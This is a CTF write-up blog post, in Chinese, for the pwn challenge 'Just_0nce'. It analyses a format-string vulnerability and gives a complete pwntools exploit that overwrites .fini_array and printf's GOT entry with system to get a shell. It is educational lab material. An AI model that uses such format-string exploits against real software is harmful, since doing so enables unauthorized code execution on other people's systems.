---
title: "nssctf pwn每日一题：[KPCTF 2024 初赛]Just_0nce"
date: 2025-01-13 12:52:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "NSSCTF"
  - "Pwn"
cnblogs_postid: "18668429"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18668429"
---

checksec
![image](/assets/cnblogs/nssctf pwn每日一题：[KPCTF 2024 初赛]Just_0nce/3539156-20250113124513497-472561894.png)
开了canary和nx

然后看ida
```
__int64 sub_40127E()
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("input:");
  read(0, buf, 0x100uLL);
  printf(buf);
  puts("It being realized!please wait...");
  sleep(1u);
  puts("...");
  sleep(1u);
  puts("...");
  sleep(1u);
  puts("...");
  sleep(1u);
  puts("Low battery, please charge");
  return 0LL;
}
```

这里有read和printf函数，可以看出这里是格式化字符串漏洞；同时，由于该程序只执行一遍，考虑使用覆盖地址让该程序强制执行两次，第二次的时候把printf地址改成system地址，最后binsh提取获得flag
这里用到pwntools里的fmtstr_payload
> fmtstr_payload(offset, writes, numbwritten=0, write_size=‘byte’)
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:systemAddress}；
第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
fmtstr_payload函数返回的就是payload

找fini地址就是Jump-Jump to segment，找到.fini-array对应的起始位置
![image](/assets/cnblogs/nssctf pwn每日一题：[KPCTF 2024 初赛]Just_0nce/3539156-20250113124727812-1402079308.png)
printf的got位置
![image](/assets/cnblogs/nssctf pwn每日一题：[KPCTF 2024 初赛]Just_0nce/3539156-20250113124909910-684814752.png)
system的plt位置
![image](/assets/cnblogs/nssctf pwn每日一题：[KPCTF 2024 初赛]Just_0nce/3539156-20250113125024672-1574095915.png)
sub函数位置（也可以用main但是都差不多）
![image](/assets/cnblogs/nssctf pwn每日一题：[KPCTF 2024 初赛]Just_0nce/3539156-20250113125057660-426798095.png)
exp
```
from pwn import *
#io=remote('node7.anna.nssctf.cn',25573)
io=process('./attachment')
context(os="linux", arch="amd64", log_level="debug")
printf_got = 0x4033F0
system_plt = 0x4011F6
fini_array = 0x4031D8
sub = 0x40127E
payload = fmtstr_payload(6, {fini_array:sub,printf_got:system_plt})
io.sendafter('input:\n',payload)
io.send(b"/bin/sh")
io.interactive()
```
